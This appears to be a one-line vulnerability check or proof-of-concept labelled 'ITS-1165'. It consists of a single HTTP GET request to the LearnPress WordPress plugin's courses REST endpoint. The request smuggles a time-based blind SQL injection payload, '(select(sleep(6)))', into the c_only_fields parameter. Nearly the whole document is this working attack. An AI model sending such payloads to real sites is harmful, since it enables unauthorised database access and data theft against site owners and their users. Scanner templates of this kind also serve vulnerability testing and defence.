# Vulnerable: ITS-1165
GET /wp-json/learnpress/v1/courses?course_filter=&c_only_fields=post_title,(select(sleep(6))),ID&
